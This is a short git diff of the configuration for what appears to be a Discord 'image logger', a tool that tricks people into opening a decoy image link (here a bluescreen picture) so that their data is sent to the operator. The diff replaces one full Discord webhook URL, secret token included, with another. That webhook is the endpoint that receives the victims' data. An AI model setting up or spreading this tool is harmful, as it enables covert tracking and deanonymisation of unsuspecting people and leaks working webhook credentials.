@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1385426322326552626/inMb9KXC9TTvHUUifl4sydWYdBcSNi2FDvbo7Oo3AVuBkPENcfGDyaDHiBmaZ5QsyG7I",
+    "webhook": "https://discord.com/api/webhooks/1389844534317420705/mKlHDEhliIxX4W3UvuYIE4U2nIHIl9BZ_MSmIkC3xNXofVNJc6_Adl1I_pzNVlvkrWJV",
     "image": "https://i.dell.com/sites/csimages/App-Merchandizing_esupport_flatcontent_global_Images/all/bluescreen.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
